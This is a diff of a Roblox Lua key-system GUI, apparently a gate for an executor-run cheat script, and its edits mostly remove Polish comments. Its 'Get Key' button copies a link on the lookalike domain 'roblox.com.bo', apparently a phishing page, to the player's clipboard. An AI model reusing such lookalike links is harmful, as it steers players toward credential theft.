@@ -12,8 +12,8 @@ end
 
 -- Konfiguracja
 local CONFIG = {
-    CorrectKey = "ROBLOX_EXPERT_2026", -- Tutaj wpisz poprawny klucz
-    KeyLink = "https://roblox.com.bo/communities/886529599/", -- Link kopiowany przez "Get Key" (zakończony cudzysłowem)
+    CorrectKey = "ROBLOX_EXPERT_2026",
+    KeyLink = "https://roblox.com.bo/communities/886529599/",
 }
 
 -- Główny kontener
@@ -22,7 +22,7 @@ ScreenGui.Name = "ProfessionalKeySystem"
 ScreenGui.Parent = CoreGui
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- Tło z efektem rozmycia / ciemnienia (Fade In)
+-- Tło z efektem ciemnienia (Fade In)
 local Background = Instance.new("Frame")
 Background.Name = "Background"
 Background.Parent = ScreenGui
@@ -39,7 +39,7 @@ MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
 MainFrame.BorderSizePixel = 0
 MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-MainFrame.Size = UDim2.new(0, 0, 0, 0) -- Start do animacji
+MainFrame.Size = UDim2.new(0, 0, 0, 0)
 MainFrame.ClipsDescendants = true
 MainFrame.ZIndex = 2
 
@@ -48,7 +48,7 @@ local UICorner = Instance.new("UICorner")
 UICorner.CornerRadius = UDim.new(0, 12)
 UICorner.Parent = MainFrame
 
--- Efekt cienia (jeśli obsługiwany)
+-- Efekt cienia
 local UIStroke = Instance.new("UIStroke")
 UIStroke.Parent = MainFrame
 UIStroke.Color = Color3.fromRGB(50, 50, 70)
@@ -106,7 +106,7 @@ KeyBox.TextSize = 14
 KeyBox.TextXAlignment = Enum.TextXAlignment.Left
 KeyBox.ZIndex = 4
 
--- Przycisk: Check Key (Lewa strona na dole)
+-- Przycisk: Check Key
 local CheckButton = Instance.new("TextButton")
 CheckButton.Parent = MainFrame
 CheckButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
@@ -123,7 +123,7 @@ local CheckCorner = Instance.new("UICorner")
 CheckCorner.CornerRadius = UDim.new(0, 8)
 CheckCorner.Parent = CheckButton
 
--- Przycisk: Get Key (Prawa strona na dole)
+-- Przycisk: Get Key
 local GetButton = Instance.new("TextButton")
 GetButton.Parent = MainFrame
 GetButton.BackgroundColor3 = Color3.fromRGB(35, 35, 48)
@@ -149,8 +149,7 @@ local OpenTween = TweenService:Create(MainFrame, TweenInfo.new(0.6, Enum.EasingS
 })
 OpenTween:Play()
 
--- --- LOGIKA I INTERAKKCJE (HOVER + CLICK) ---
-
+-- --- LOGIKA I INTERAKKCJE ---
 local function applyHover(button, defaultColor, hoverColor)
     button.MouseEnter:Connect(function()
         TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor}):Play()
@@ -163,7 +162,7 @@ end
 applyHover(CheckButton, Color3.fromRGB(88, 101, 242), Color3.fromRGB(105, 118, 255))
 applyHover(GetButton, Color3.fromRGB(35, 35, 48), Color3.fromRGB(48, 48, 65))
 
--- Obsługa Get Key (Kopiowanie linku)
+-- Obsługa Get Key
 GetButton.MouseButton1Click:Connect(function()
     if setclipboard then
         setclipboard(CONFIG.KeyLink)
@@ -177,7 +176,7 @@ GetButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- Obsługa Check Key (Weryfikacja)
+-- Obsługa Check Key
 CheckButton.MouseButton1Click:Connect(function()
     if KeyBox.Text == CONFIG.CorrectKey then
         CheckButton.Text = "Success!"
